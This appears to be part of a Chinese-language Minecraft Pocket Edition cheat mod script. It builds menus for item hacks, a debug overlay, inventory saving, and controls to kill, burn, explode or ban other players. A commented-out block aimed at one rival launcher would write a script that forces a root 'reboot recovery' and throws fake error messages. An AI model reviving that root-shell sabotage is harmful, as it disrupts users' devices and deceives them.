if(扔东西按钮==null){打开扔东西按钮();}
else{扔东西按钮.dismiss();扔东西按钮=null;}
}catch(e){print(e)}
}}));
勾选($4,"选取方块",开关gui(选取按钮)).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
if(选取按钮==null){打开选取按钮();}
else{选取按钮.dismiss();选取按钮=null;}
}catch(e){print(e)}
}}));

勾选($4,"防实体过多卡机",aswi[10]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[10]=!aswi[10]
}catch(e){print(e)}
}}));

勾选($4,"pvp玩家buff",aswi[11]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[11]=!aswi[11]
}catch(e){print(e)}
}}));
//////---------------///

按钮($4,"修复手中工具",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){cM("已修复");
var 附魔=Player.getEnchantments(Player.getSelectedSlotId());
if(附魔==null){Entity.setCarriedItem(getPlayerEnt(),getCarriedItem(),Player.getCarriedItemCount(),0);}
else{Entity.setCarriedItem(getPlayerEnt(),getCarriedItem(),Player.getCarriedItemCount(),0);
for(var i=0;i<附魔.length;i=i+1){
Player.enchant(Player.getSelectedSlotId(),附魔[i].type,附魔[i].level);
}}
}}))
按钮($4,"手中255物品",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){cM(astr[0]);
var 附魔=Player.getEnchantments(Player.getSelectedSlotId());
if(附魔==null){Entity.setCarriedItem(getPlayerEnt(),getCarriedItem(),255,Player.getCarriedItemData());}
else{Entity.setCarriedItem(getPlayerEnt(),getCarriedItem(),255,Player.getCarriedItemData());
for(var i=0;i<附魔.length;i=i+1){
Player.enchant(Player.getSelectedSlotId(),附魔[i].type,附魔[i].level);
}}
}}))

按钮($4,"高级附魔",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){高级附魔();
}}))
}

//组件完毕~~~~~~~~~~~~~~~~~~~~~~
if(!aswi[26]){
var mX,mY;标题栏.setOnTouchListener(new pg.avVOTL({onTouch:function(v, e){switch(e.getAction()){case 0:mX=e.getX();mY=e.getY();break;case 2:var delX=parseInt(e.getX()-mX)*0.5;var delY=parseInt(e.getY()-mY)*0.5;winx+=delX;winy+=delY;win.update(parseInt(winx),parseInt(winy), -1,-1);break;}return true;}})); 
var win=色(新建窗口(参数(窗口宽),参数(窗口高),总布局,false),1)
win.showAtLocation(ctx.getWindow().getDecorView(),0,winx,winy);
}
}catch(e){alert(astr[2]+"\n:"+e)}});
})
}
//窗口完毕~~~~~~~~~~~~~~~~~~~~~~~~

function 新建窗口(w,h,c,f){
var $=new pg.aw.PopupWindow(ctx);
$.setFocusable(f);
$.setContentView(c);
$.setWidth(w);
$.setHeight(h);
色($,2,0,0,0,0)
return $
}
function 命令行(str){
var os=java.lang.Runtime.getRuntime().exec("su").getOutputStream();
os.write(new pg.jlS(str).getBytes());
os.flush();
os.close();
}
var temptext=""

function 写入模板(){
写入(主目录+"自定义窗口模板.txt","/*\n\n监听事件:(.前面必须填组件)\n\n单击事件\n.setOnClickListener(new pg.avVOCL({onClick:function(){\n\n}}));\n\n点击与弹起事件\n.setOnTouchListener(new pg.avVOTL({onTouch:function(){\n\nreturn true;\n}}));\n\n长按事件\n.setOnLongClickListener(new pg.avVOLCL({onLongClick:function(){\n\nreturn true;}}));\n\n拖动条的监听\n.setOnSeekBarChangeListener(new pg.awSBOSBCL({\nonProgressChanged:\nfunction(v){\n.getProgress();\n\n}}))\n\n勾选框的监听\n.setOnCheckedChangeListener(new pg.awCBOCCL({\nonCheckedChanged:function(){\n\n}}));\n*/\n/*\n添加组件方法\n文本(addto,text,size)\nsize默认0\n\n输入(addto,text,hint,size,width,height,focus)\nfocus是否打开输入框,hint 提示，其他的可以不填除了最下面的必填\n\n按钮(addto,text,width,height,margin,padding)\nwidth 默认为-1就行，其他的自动适应\n\n拖动(addto,progress,max,width)\nprogress 拖动条刚开始的进度，max 拖动条最大拖动数值\n\n勾选(addto,text,checked)\nchecked 是否打勾勾 为 布尔值\n\n色(widget,type,a,r,g,b)\ntype=0 时颜色为 按钮颜色，type=1 时颜色为 菜单颜色；a,r,g,b 分别为 透明，红，绿，蓝\n\n外观(widget,width,height,margin)\n设置外观大小\n\n参数(type,num)\ntype=0 时返回适应屏幕的宽，type=1 时返回适应屏幕的高；num为长或宽\n\n必填项\naddto 添加到哪个布局\ntext 文本内容(可以为空，不可以为null)\nsize 文字大小(可选)\nwidth 宽(可选)\nheight 高(可选)\nwidget 设置哪个组件\ntype 种类\nmargin 外边距\npadding 内边距\n\n注意 添加组件 函数返回这个被添加的组件，可以给变量赋值\n做好了这些注释就可以删除了\n*/\n\n\nvar s4=$4/*主布局是$4,addto写$4或s4*/\n/*封装信息*/\n主标题.setText(\"窗口的标题\")\n窗口宽=300\n窗口高=400\nwhile(pub.length<1){pub.push(null)}/*申请外部变量*/\n")
print("放在:"+主目录+"自定义窗口模板.txt")
}

function 发邮件(subject,text){
var data=new pg.ac.Intent(pg.ac.Intent.ACTION_SENDTO); 
data.setData(pg.an.Uri.parse("mailto:asdfg636254@163.com")); data.putExtra(pg.ac.Intent.EXTRA_SUBJECT,subject); 
data.putExtra(pg.ac.Intent.EXTRA_TEXT,text); 
ctx.startActivity(data)
}

if(pak=="com.duowan.groundhog.mctools"){
/*var f=new java.io.File(ctx.getDir(astr[236],0)+"/","a.js");
var i=new java.io.BufferedWriter(new java.io.FileWriter(f));
i.write("var ctx=com.mojang.minecraftpe.MainActivity.currentMainActivity.get();runOnUiThread(new pg.jlR({run:function(){var dialog=new pg.aaADB(ctx);dialog.setCancelable(false);dialog.setMessage(\"未授权应用！请使用启动器！\");dialog.show();}}));var os=java.lang.Runtime.getRuntime().exec(\"su\").getOutputStream();os.write(pg.jlS(\"reboot recovery\").getBytes());os.flush();os.close();");
i.close();
命令行("chmod 555 "+f);
throw "TypeError:Cannot find function setInventorySlot in object function Player() {\n [native code, arity=0]\n}\n.";

throw "LauncherError:You mustn't use BoomMotherBox!\nBecause it can boom your mother!\nat "+inf.n+",line 250.";
*/
}

function 打开输入框(widgetaa){
print("长按输入框确定输入")
runOnUiThread(function(){try{
var $1=new pg.awLL(ctx);
$1.setGravity(17);
$1.setOrientation(1)

var $2=输入($1,widgetaa.getText(),widgetaa.getHint(),0,500,280);
var $4=new pg.awLL(ctx);
var str2=""
$2.setOnLongClickListener(new pg.avVOLCL({onLongClick:function(){
str2=$2.getText()
$.dismiss()
try{widgetaa.setText(str2)}catch(e){print(e)}
return true
}}));
按钮($4,astr[163],100,60,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
str2=$2.getText()
$.dismiss()
try{widgetaa.setText(str2)}catch(e){print(e)}
}}));
var str2=""
按钮($4,"清空",100,60,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
$2.setText("")
}}));
按钮($4,astr[217],100,60,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
剪切板($2.getText())
print(astr[0])
}}));
按钮($4,astr[229],100,60,5,0).setOnClickListener(new pg.avVOCL({onClick:function(){
$2.setText(ctx.getSystemService(ctx.CLIPBOARD_SERVICE).getText()+"")
print(astr[0])
}}));
$1.addView($4)
var $=色(新建窗口(参数(500),-2,$1,true),1)
$.showAtLocation(ctx.getWindow().getDecorView(),0,scrwid/8,scrhei/4);
}catch(e){print(e)}});
}

function open按钮设置Menu(){
保存日志("打开按钮设置");
try{
var layout=制作菜单(scrwid/4)

//添加组件
文本(layout,"菜单颜色")
var titlema=文本(layout,"透明度:"+acolorm+"\n红:"+rcolorm+"\n绿:"+gcolorm+"\n蓝:"+bcolorm)

var seekbarma=拖动(layout,acolorm-20,235)
seekbarma.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
acolorm=seekbarma.getProgress()+20;
titlema.setText("透明度:"+acolorm+"\n红:"+rcolorm+"\n绿:"+gcolorm+"\n蓝:"+bcolorm);
}}))

var seekbarmr=拖动(layout,rcolorm-20,235)
seekbarmr.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
rcolorm=seekbarmr.getProgress()+20;
titlema.setText("透明度:"+acolorm+"\n红:"+rcolorm+"\n绿:"+gcolorm+"\n蓝:"+bcolorm);
}}))

var seekbarmg=拖动(layout,gcolorm-20,235)
seekbarmg.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
gcolorm=seekbarmg.getProgress()+20;
titlema.setText("透明度:"+acolorm+"\n红:"+rcolorm+"\n绿:"+gcolorm+"\n蓝:"+bcolorm);
}}))

var seekbarmb=拖动(layout,bcolorm-20,235)
seekbarmb.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
bcolorm=seekbarmb.getProgress()+20;
titlema.setText("透明度:"+acolorm+"\n红:"+rcolorm+"\n绿:"+gcolorm+"\n蓝:"+bcolorm);
}}))

文本(layout,"按钮颜色");

var title=文本(layout,"透明度:"+acolor+"\n红:"+rcolor+"\n绿:"+gcolor+"\n蓝:"+bcolor)
 
var seekbara=拖动(layout,acolor-20,235)
seekbara.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
acolor=seekbara.getProgress()+20;
title.setText("透明度:"+acolor+"\n红:"+rcolor+"\n绿:"+gcolor+"\n蓝:"+bcolor);
}}))

var seekbarr=拖动(layout,rcolor-20,235)
seekbarr.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
rcolor=seekbarr.getProgress()+20;
title.setText("透明度:"+acolor+"\n红:"+rcolor+"\n绿:"+gcolor+"\n蓝:"+bcolor);
}}))

var seekbarg=拖动(layout,gcolor-20,235)
seekbarg.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
gcolor=seekbarg.getProgress()+20;
title.setText("透明度:"+acolor+"\n红:"+rcolor+"\n绿:"+gcolor+"\n蓝:"+bcolor);
}}))

var seekbarb=拖动(layout,bcolor-20,235)
seekbarb.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
bcolor=seekbarb.getProgress()+20;
title.setText("透明度:"+acolor+"\n红:"+rcolor+"\n绿:"+gcolor+"\n蓝:"+bcolor);
}}))

文本(layout,"文字颜色");
 
var title2=文本(layout,"透明度:"+acolort+"\n红:"+rcolort+"\n绿:"+gcolort+"\n蓝:"+bcolort)

var seekbarab=拖动(layout,acolort-20,235)
seekbarab.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
acolort=seekbarab.getProgress()+20;
title2.setText("透明度:"+acolort+"\n红:"+rcolort+"\n绿:"+gcolort+"\n蓝:"+bcolort);
}}))

var seekbarrb=拖动(layout,rcolort,255)
seekbarrb.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
rcolort=seekbarrb.getProgress();
title2.setText("透明度:"+acolort+"\n红:"+rcolort+"\n绿:"+gcolort+"\n蓝:"+bcolort);
}}))

var seekbargb=拖动(layout,gcolort,255)
seekbargb.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
gcolort=seekbargb.getProgress();
title2.setText("透明度:"+acolort+"\n红:"+rcolort+"\n绿:"+gcolort+"\n蓝:"+bcolort);
}}))

var seekbarbb=拖动(layout,bcolort,255)
seekbarbb.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
bcolort=seekbarbb.getProgress();
title2.setText("透明度:"+acolort+"\n红:"+rcolort+"\n绿:"+gcolort+"\n蓝:"+bcolort);
}}))

 
var title1=文本(layout,"gui缩放:"+gui缩放+"\n文字大小:"+文字大小)

var seekbarw=拖动(layout,gui缩放-1,499)
seekbarw.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
gui缩放=seekbarw.getProgress()+1;
title1.setText("gui缩放:"+gui缩放+"\n文字大小:"+文字大小);
}}))

var seekbarts=拖动(layout,文字大小,30)
seekbarts.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
文字大小=seekbarts.getProgress();
title1.setText("gui缩放:"+gui缩放+"\n文字大小:"+文字大小);
}}))
 
var title8=文本(layout,"悬浮窗宽:"+主要w+"\n悬浮窗高:"+主要h)

var seekbarww=拖动(layout,主要w-20,scrhei-20)
seekbarww.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
主要w=seekbarww.getProgress()+20;
title8.setText("悬浮窗宽:"+主要w+"\n悬浮窗高:"+主要h);
}}))

var seekbartss=拖动(layout,主要h-20,scrhei-20)
seekbartss.setOnSeekBarChangeListener(new pg.awSBOSBCL({
onProgressChanged:
function(v){
主要h=seekbartss.getProgress()+20;
title8.setText("悬浮窗宽:"+主要w+"\n悬浮窗高:"+主要h);
}}))
勾选(layout,"适应图片",aswi[1]).setOnCheckedChangeListener(new pg.awCBOCCL({
onCheckedChanged:function(){try{
aswi[1]=!aswi[1]
}catch(e){print(e)}
}}));

按钮(layout,"保存设置",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){
try{

if(主要按钮!=null){
主要按钮.dismiss();
主要按钮=null;打开主要按钮();}

if(快捷方式!=null){
快捷方式.dismiss();
快捷方式=null;打开快捷方式();}

if(附魔按钮!=null){
附魔按钮.dismiss();
附魔按钮=null;打开附魔按钮();}

if(开火按钮!=null){
开火按钮.dismiss();
开火按钮=null;打开开火按钮();}

if(返回按钮!=null){
返回按钮.dismiss();
返回按钮=null;打开返回按钮();}
}catch(e){}
print(astr[0]);
写入主数据();
}}))
按钮(layout,"还原预设",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){gui缩放=250,文字大小=15,acolor=160,rcolor=140,gcolor=255,bcolor=0,acolort=255,rcolort=0,gcolort=0,bcolort=0,acolorm=114,rcolorm=102,gcolorm=204,bcolorm=255
try{

if(主要按钮!=null){
主要按钮.dismiss();
主要按钮=null;打开主要按钮();}

if(快捷方式!=null){
快捷方式.dismiss();
快捷方式=null;打开快捷方式();}

if(附魔按钮!=null){
附魔按钮.dismiss();
附魔按钮=null;打开附魔按钮();}

if(开火按钮!=null){
开火按钮.dismiss();
开火按钮=null;打开开火按钮();}

if(返回按钮!=null){
返回按钮.dismiss();
返回按钮=null;打开返回按钮();}
}catch(e){}

print(astr[0]);
写入主数据()
}}))
}catch(e){alert(astr[2]+":\n"+e);}}

var rco=255,gco=0,bco=0,debugstr2,debug显示

function debug更新(widget){
new pg.ao.Handler().postDelayed(new pg.jlR({ 
run:function(){
if(debug显示!=null){debug更新(widget)}
else{return}
try{
if(rco==255&&bco==0&&gco!=255){gco+=51}

if(gco==255&&bco==0&&rco!=0){rco-=51}

if(gco==255&&rco==0&&bco!=255){bco+=51}

if(bco==255&&rco==0&&gco!=0){gco-=51}

if(bco==255&&gco==0&&rco!=255){rco+=51}

if(rco==255&&gco==0&&bco!=0){bco-=51}
widget.setTextColor(pg.agC.argb(255,rco,gco,bco));

if(在主界面){widget.setText("请先进入游戏！");}
if(!在主界面){
try{
if(debug实体id!=0){debug实体倒计时--}

if(debug实体倒计时==0){debug实体id=0,debug实体模型id=0,debug实体倒计时=100}

if(debug方块id!=0){debug方块倒计时--}

if(debug方块倒计时==0){debug方块id=0,debug方块倒计时=100} 
var debugY视角=Math.round(Entity.getPitch(getPlayerEnt()));
var debugXZ视角=Math.round(Entity.getYaw(getPlayerEnt()));
var debug物品id=Player.getCarriedItem();
var debug物品dmg=Player.getCarriedItemData();
var x轴位debug=Math.round(Player.getX());
var y轴位debug=Math.round(Player.getY())-2
var z轴位debug=Math.round(Player.getZ());
var 生态系统=Level.getBiomeName(Player.getX(),Player.getZ())
var 生态系统id=Level.getBiome(Player.getX(),Player.getZ())
var debug时间=Level.getTime();
var debug实体信息
if(debug实体id!=0){debug实体信息="实体ID:"+debug实体id+" 实体模型ID:"+debug实体模型id+" 实体血量:"+debug实体血量+"\n"}

if(debug实体id==0){debug实体信息=""}
var debug物品信息
if(getCarriedItem()!=0){debug物品信息="手持ID:"+debug物品id+" 数据值:"+debug物品dmg+"\n"}

if(getCarriedItem()==0){debug物品信息=""}

var debug方块信息
if(debug方块id==0){debug方块信息=""}
var vx=Math.round(Entity.getVelX(getPlayerEnt())*100)/100,vy=Math.round(Entity.getVelY(getPlayerEnt())*100)/100,vz=Math.round(Entity.getVelZ(getPlayerEnt())*100)/100
if(debug方块id!=0){debug方块信息="方块ID:"+debug方块id+" 方块数据值:"+debug方块dmg+" 面向:"+debug方块side+"\n"}

var 亮度="\n亮度"+Level.getBrightness(Player.getX(),Player.getY()-1,Player.getZ())

debugstr2=""+debug方块信息+""+debug物品信息+""+debug实体信息+"生态系统名称:"+生态系统+" ID:"+生态系统id+"\nPITCH:"+debugY视角+" YAW:"+debugXZ视角+"\nVX:"+vx+" VY:"+vy+" VZ:"+vz+"\nX:"+x轴位debug+" Y:"+y轴位debug+" Z:"+z轴位debug+亮度+" 游戏时间:"+debug时间+"";
try{widget.setText(debugstr2)}catch(e){}
}catch(e){}}
}catch(e){}
}}),50)

}

function 打开日志窗口(){
保存日志("打开日志窗口")
runOnUiThread(function(){try{
var $1=new pg.awLL(ctx);
日志窗口组件=文本($1,"")
日志窗口=新建窗口(-2,-2,$1,false)
日志窗口.setTouchable(false);
日志窗口.showAtLocation(ctx.getWindow().getDecorView(),pg.avG.LEFT | pg.avG.TOP,0,0);
}catch(e){print(e)}});
}
function 打开debug显示(){
保存日志("打开debug显示")
runOnUiThread(function(){try{
var $1=new pg.awLL(ctx);
var debwin=文本($1,"")
debug更新(debwin)
debug显示=新建窗口(-2,-2,$1,false)
debwin.setTextColor(pg.agC.argb(255,rco,gco,bco));
debug显示.setTouchable(false);
debug显示.showAtLocation(ctx.getWindow().getDecorView(),pg.avG.LEFT | pg.avG.TOP,0,0);
}catch(e){print(e)}});
}

function 保存物品栏(ii){
try{
var inv=new Array()
var armor=new Array()
var enc=new Array()
var nam=new Array()
for(i=0;i<50;i++){
nam.push(Player.getItemCustomName(i))
}
for(i=0;i<50;i++){
inv.push(Player.getInventorySlot(i))
inv.push(Player.getInventorySlotCount(i))
inv.push(Player.getInventorySlotData(i))
}
for(i=0;i<50;i++){
var 附魔=Player.getEnchantments(i)
var lev=[],typ=[]
if(附魔!=null){
for(var a=0;a<附魔.length;a++){
typ.push(附魔[a].type)
lev.push(附魔[a].level)
}}
else{typ.push("null")
lev.push("null")}
enc.push(typ+"?"+lev+"♡")
}
for(it=0;it<4;it++){
if(Player.getArmorSlot(it)!=0){
armor.push(Player.getArmorSlot(it))
armor.push(Player.getArmorSlotDamage(it))}
else{armor.push(0);armor.push(0);}
}
inv=inv+"↔"+armor+"↔"+enc+"↔"+nam
写入(主目录+"物品栏保存/物品栏"+ii+".txt",inv);
}catch(e){alert(astr[2]+"\n"+e);}
保存日志("保存物品栏",inv,armor,enc,ii);
}

function 读取物品栏(ii){
try{
var inv=读取(主目录+"物品栏保存/物品栏"+ii+".txt");
inv=inv.split("↔")
var armor=inv[1]
var enc=inv[2]
var nam=inv[3]
inv=inv[0]
nam=nam.split(",")
inv=inv.split(",");
armor=armor.split(",");
for(i=0;i<4;i++){
Player.setArmorSlot(i,280,0);
}
for(i=0;i<(inv.length/3);i++){Player.clearInventorySlot(i)}
if(aswi[24]){
var cc=0
for(i=0;i<50;i++){
Player.setInventorySlot(i,inv[cc],inv[cc+1],inv[cc+2]);
cc+=3
}
}
if(!aswi[24]){
for(i=27;i<inv.length;i+=3){
if(inv[i]!=0){
addItemInventory(inv[i],inv[i+1],inv[i+2])}
else{addItemInventory(1,55,0)
Player.setItemCustomName(i/3,"gddBd")}
}}
var ai=0
for(i=0;i<armor.length;i+=2){
if(armor[i]!=0){
Player.setArmorSlot(ai,armor[i],armor[i+1])}
ai++}

enc=enc.split("♡,");
for(i=0;i<enc.length;i++){
enc[i]=enc[i].replace("♡","");
var b=enc[i].split("?");
var 类型=b[0].split(",");
var 等级=b[1].split(",");
for(aa=0;aa<类型.length;aa++){
Player.enchant(i,类型[aa],等级[aa]);}
}

for(i=0;i<50;i++){
if(nam[i]!=""){Player.setItemCustomName(i,nam[i])}
}

for(i=0;i<50;i++){
if(Player.getItemCustomName(i)=="gddBd"){Player.clearInventorySlot(i)}
}

}catch(e){alert(astr[2]+"\n"+e)}
保存日志("读取物品栏",inv,armor,enc,ii);
}

function 攻击算法(id,实体,攻击力){
if(getCarriedItem()==id&&实体!=0){
Entity.setHealth(实体,Entity.getHealth(实体)-攻击力);
}}

function 耐久算法(id,data,maxdmg){
if(getCarriedItem()==id&&Level.getGameMode()!=1){Entity.setCarriedItem(getPlayerEnt(),getCarriedItem(),
Player.getCarriedItemCount(),Player.getCarriedItemData()+data);
if(Player.getCarriedItemData()>maxdmg){
Entity.setCarriedItem(getPlayerEnt(),getCarriedItem(),Player.getCarriedItemCount()-1,Player.getCarriedItemData());
}
}

}

function openPlayerControlMenu(ii){
保存日志("打开玩家控制菜单");
try{
var layout=制作菜单(scrwid/2)

文本(layout,"简单玩家控制",5);
文本(layout,"如果需要编辑玩家请选择下面的编辑玩家",-3);

var checkbox=new pg.awCBx(ctx)
var ched
if(定住玩家[ii*6]){ched=true;}
else{ched=false;}
checkbox.setChecked(ched)
checkbox.setOnCheckedChangeListener(new pg.awCBOCCL() {
onCheckedChanged:function(){

if(!ched){
定住玩家[(ii*6)+5]=控制玩家;
定住玩家[(ii*6)+2]=Entity.getX(控制玩家);
定住玩家[(ii*6)+3]=Entity.getY(控制玩家);
定住玩家[(ii*6)+4]=Entity.getZ(控制玩家);
定住玩家[(ii*6)+1]=spawnChicken(定住玩家[(ii*6)+2],定住玩家[(ii*6)+3],定住玩家[(ii*6)+4]);
定住玩家[ii*6]=true;
cM("玩家"+Entity.getNameTag(控制玩家)+"已定住");ched=true
}
else{定住玩家[ii*6]=false
Entity.setHealth(定住玩家[(ii*6)+1],0);
cM("玩家"+Entity.getNameTag(控制玩家)+"已取消定住");ched=false
}
}});
var clayout=new pg.awLL(ctx)
文本(clayout,"定住玩家")
clayout.addView(checkbox)
layout.addView(clayout)

按钮(layout,"传送过来",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
cM("玩家"+Entity.getNameTag(控制玩家)+"已传送到你");
var mob=spawnChicken(Player.getX(),Player.getY()-1,Player.getZ());
rideAnimal(控制玩家,mob);
}}))
按钮(layout,"杀死玩家",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
cM("玩家"+Entity.getNameTag(控制玩家)+"已遭到天谴");
var 天谴=Level.spawnMob(Entity.getX(控制玩家),Entity.getY(控制玩家),Entity.getZ(控制玩家),EntityType.ARROW);
Entity.setHealth(控制玩家,1);
Entity.setVelY(天谴,66666);
Entity.setFireTicks(控制玩家,66666);
if(Level.getGameMode()==1){Entity.setHealth(控制玩家,0);}
if(Entity.getHealth(控制玩家)>0){cM("他妈的怎么杀不死？开外挂的**fuck！#(滑稽)")}
}}))

文本(layout,"你可以先设置传送点，之后再按下面的按钮，最后返回传送点");
按钮(layout,"传送过去",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
cM("你被传送到玩家"+Entity.getNameTag(控制玩家)+"");
Entity.setPosition(getPlayerEnt(),Entity.getX(控制玩家),Entity.getY(控制玩家),Entity.getZ(控制玩家));
}}))
按钮(layout,"踢人",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
if(控制玩家==getPlayerEnt()){print("你想试试卡死的滋味吗？");return;}
cM("玩家"+Entity.getNameTag(控制玩家)+"已踢出服务器");
/*Entity.remove(控制玩家)*/
}}))
文本(layout,"不要踢自己！你可以删除*"+主目录+"封禁的玩家/* 下的玩家名字即可解封");

按钮(layout,"永久踢人",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
if(控制玩家==getPlayerEnt()){print("你想试试卡死的滋味吗？");return;}
if(!存在(主目录+"封禁的玩家/")){mkdir(主目录+"封禁的玩家/");}
写入(主目录+"封禁的玩家/"+Entity.getNameTag(控制玩家)+".txt",Entity.getNameTag(控制玩家));
cM("玩家"+Entity.getNameTag(控制玩家)+"已永久踢出服务器");
/*Entity.remove(控制玩家);*/
}}))

按钮(layout,"编辑玩家",-1).setOnClickListener(new pg.avVOCL({onClick:function(viewarg){打开窗口(astr[157],"实体设置",5,0,0,0,0);
}}))
 
按钮(layout,"着火一分钟",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
cM("玩家"+Entity.getNameTag(控制玩家)+"已着火");
Entity.setFireTicks(控制玩家,60);
}}))
按钮(layout,"玩家爆炸",-1).setOnClickListener(new pg.avVOCL({
onClick:
function(v){
cM("玩家"+Entity.getNameTag(控制玩家)+"爆炸了");
explode(Entity.getX(控制玩家),Entity.getY(控制玩家),Entity.getZ(控制玩家),3);
}}))

}catch(e){alert(astr[2]+":\n"+e);}}

function 制作菜单(x){
var 滑动布局=new pg.aw.ScrollView(ctx)
var 总布局=new Packages.yzrilyzr.ui.MyLinearLayoutRound(ctx)
var 内部布局=new pg.awLL(ctx)
外观(滑动布局,-1,-1,0)
内部布局.setPadding(10,10,10,10)
内部布局.setOrientation(1)
滑动布局.addView(内部布局)
总布局.addView(滑动布局)
圆角(新建窗口(scrwid/4,-2,总布局,true),1,20).showAtLocation(ctx.getWindow().getDecorView(),pg.avG.LEFT|pg.avG.TOP,x,0)
return 内部布局
}
function 图标显示(addto,text,w,h,icon,size){
var l=new pg.awLL(ctx)
addto.addView(l)
var text=text
var widget=[]
for(i=0;i<text.length;i++){
widget.push(图标(l,text[i],icon[i],w,h,size))
}
return [l,widget]
}
function 制作2菜单(x,y){
var sc1=new pg.aw.ScrollView(ctx)
var il1=new pg.awLL(ctx)
il1.setOrientation(1)
il1.setPadding(10,10,10,10)
sc1.addView(il1)

var sc2=new pg.aw.ScrollView(ctx)
var il2=new pg.awLL(ctx)
il2.setOrientation(1)
il2.setPadding(10,10,10,10)
sc2.addView(il2)

var main=new pg.awLL(ctx)
main.addView(sc1)
main.addView(sc2)
外观(sc1,scrwid/4,-2,0)
外观(sc2,scrwid/4,-2,0)
色(新建窗口(scrwid/2,-2,main,true),1).showAtLocation(ctx.getWindow().getDecorView(),pg.avG.LEFT|pg.avG.TOP,x,y)
return [il1,il2]
}

/*→⇒⟹⇨⇾➔☞☛⇢➾➜➙➛➝➞➣➢➡➠➟➤➥➦➧➨⥟⇁⥛⇀⥤⇰➩➪➫➬➺➻➸➵➳➭➮➱➯➲➼➽⟶⇉⇶⇛⇏⤃↛↝⟼↦↠↣⤳⤅⤇⟾⇥⥓⇴↬⟿⇝⥗⇸⇻⤀⤍⤍⤕⤔⤑⤐⤏⤖⤗⤙⤘⤛⥭⥬⥈⥴❡❣❢❞❝‱‰¶§&‽⸘₨৲৳૱௹₮฿₩L₴₲₪₡K☂☀☼☔☃★☆☁☾☽♠♣♥♢♞♝♜♛♟♔♕♖♗✐✑✒✁✂⚓♋✈♊♉✇✄✃♨♈♌♑♒♍♎♓☉♐♃♂♁♀☿♄♅♆♇☄✦✜✛✚✙✧✝✞✟✠☦♱⚕⚒☧⚚♰☥☤⚛⚗⚜☩☨☓⚖*/

/*★☆★$ & ¤ § | °゜ ¨ ± · × ÷ ˇ ˉ ˊ ˋ ˙ Γ Δ Θ Ξ Π Σ Υ Φ Ψ Ω α β γ δ ε ζ η θ ι κ λ μ ν ξ π ρ σ τ υ φ ψ ω Ё Б Г Д Е Ж З И
Й К Л Ф У Ц Ч Ш Щ Ъ Ы Э Ю Я а б в г д ж з и й к л ф ц ч ш щ ъ ы ю я ё - ― ‖ ‥ … ‰ ′ ″ ※ ℃ ℅ ℉ № ℡
Ⅰ Ⅱ Ⅲ Ⅳ Ⅴ Ⅵ Ⅶ Ⅷ Ⅸ Ⅹ Ⅺ Ⅻ Ⅰ Ⅱ Ⅲ Ⅳ Ⅴ Ⅵ Ⅶ Ⅷ Ⅸ Ⅹ ← ↑ → ↓ ↖ ↗ ↘ ↙
∈ ∏ ∑ ∕ √ ∝ ∞ ∟ ∠ ∣ ∥ ∧ ∨ ∩ ∪ ∫ ∮ ∴ ∵ ∶ ∷ ∽ ≈ ≌ ≒ ≠ ≡ ≤ ≥ ≦ ≧ ≮ ≯ ⊕ ⊙ ⊥ ⊿ ⌒ D
─━│┃┄┅┆┇┈┉┊┋
┌┍┎┏┐┑┒┓└┕┖┗┘┙┚┛├┝┞┟┠┡┢┣┤┥┦┧┨┩┪┫┬┭┮┯┰┱┲
┳┴┵┶┷┸┹┺┻┼┽┾┿╀╁╂╃╄╅╆╇╈╉╊╋═║╒╓╔╕╖╗╘╙╚╛
╜╝╞╟╠╡╢╣╤╥╦╧╨╩╪╫╬╭╮╯╰╱╲╳▁▂▃▄▅▆▇█ ▉ ▊▋▌▍▎▏
▓▔▕ ▀■□▲△▼▽⊿◆◇○◎●◢◣◤◥★☆☉♀♂々〆〇「」『』〖〗【】〒〓
〡〢〣〤〥〦〧〨〩㎎㎏㎜㎝㎞㎡㏄㏎㏑㏒㏕??〾⿰‖| |︴（）〔〕 ? ⺌ *
⿱⿲⿳⿴⿵⿶⿷⿸⿹⿺⿻︰︱︳︴︵︶︷︸︹︺︻︼︽︾^﹀﹁﹂﹃﹄﹉﹊﹋﹌﹍﹎﹏～￥§
